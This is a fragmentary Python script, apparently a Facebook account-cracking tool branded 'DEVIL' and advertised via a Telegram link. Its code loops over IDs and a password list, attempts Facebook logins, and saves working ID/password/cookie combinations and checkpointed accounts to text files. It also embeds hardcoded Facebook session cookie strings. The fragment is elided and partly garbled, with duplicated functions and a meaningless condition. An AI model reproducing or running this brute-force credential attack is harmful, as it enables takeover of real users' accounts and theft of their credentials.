...
\33[37;42m𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌:https://t.me/DEVILfree\33[0;m""")
def linex():
    print('\033[1;32m ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')
...
def Create():
    ...
    # 'cookie': 'datr=quuDZdFQANH1AmKWcfQygCVb; sb=quuDZUxyKDpJPc7Ss49yeJ0c; dpr=2.1988937854766846; m_pixel_ratio=2.1988937854766846; wd=891x1664; fr=0UduNYHdmXMWD8Bx9..Blg-uq.ap.AAA.0.0.Bli5fp.AWVd2-7STb4',
    'dpr': '2',
           ...
           if "9":
              ...
              if requests=="chk":
                ...
                pass
                 ...
                 print("\r\r\033[1;32m [DEVIL-OK] "+uid+'|'+pas+'|'+coki)
                 
                 ok+=1
                 open("/sdcard/DEVIL/AUTO-OK.txt","a").write(uid+"|"+pas+"|"+coki+"\n")
        ...
        for x in range(lim):
            ...
            try:
                ...
                if 'checkpoint' in getts.url:
                    ...
                    print ('\r\033[1;32m [DEVIL-OK] '+cok['c_user']+' | '+passw+'\033[0;97m     ')
        ...
        try:
            ...
            for pw in passlist:
                ...
                if 'session_key' in q:
                    ...
                    open('/sdcard/Emran/DEVIL-OK.txt','a').write(ids+'|'+pas+'\n')
                    oks.append(ids)
                    break
                elif 'www.facebook.com' in q['error_msg']:
                    if 'y' in pcp:
                        print('\r\r\x1b[38;5;205m [LUCK-CP] '+ids+' | '+pas+'\033[1;97m')
                        open('/sdcard/Emran/LUCK-CP.txt','a').write(ids+'|'+pas+'\n')
                        cps.append(ids)
                        break
                    else:
...
def Create():
    ...
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    # 'cookie': 'datr=quuDZdFQANH1AmKWcfQygCVb; sb=quuDZUxyKDpJPc7Ss49yeJ0c; m_ls=%7B%22c%22%3A%7B%221%22%3A%22HCwAABb4pBEW5MDy0QkTBRbCv5b72MEtAA%22%2C%222%22%3A%22GSwVQBxMAAAWBBaQ_ODYDBYAABV-HEwAABYAFpD84NgMFgAAFigA%22%2C%2295%22%3A%22HCwAABZOFp7C_uAPEwUWwr-W-9jBLQA%22%7D%2C%22d%22%3A%227dfee140-98e4-43c1-8152-ab1fc5455547%22%2C%22s%22%3A%220%22%2C%22u%22%3A%22yhdkzk%22%7D; wd=891x1664; fr=1E7EHVWekQSgwfXp1.AWWjpeGof_IZQtZr-zCld_2B_ws.BljCCZ.ap.AAA.0.0.BljOUu.AWX0N83rurQ; dpr=2.1988937854766846',
    'dpr': '2',
    'referer': 'https://web.facebook.com/bookmarks',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.26"',
    'sec-ch-ua-mobile': '?0',
